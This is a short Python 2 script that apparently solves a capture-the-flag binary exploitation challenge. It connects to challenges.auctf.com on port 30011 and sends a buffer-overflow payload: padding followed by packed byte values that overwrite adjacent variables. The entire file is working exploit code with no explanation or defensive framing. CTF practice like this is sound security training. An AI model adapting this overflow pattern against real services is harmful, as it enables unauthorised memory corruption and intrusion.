import socket
import struct 

s = socket.socket()
s.connect(('challenges.auctf.com', 30011))
raw_input("Attach dbg")
r = s.recv(1024)
print r
padding = 'aabbccddeeffgghh'
payload = padding + "\x2a\x00\x00\x00" + "\x63\x74\x2a\x00" + "\x63\x74\x66\x00" + "\x14\x00\x1e\xff" + "\x37\x13\x00" + "\n"
s.send(payload)
r = s.recv(1024)
print r

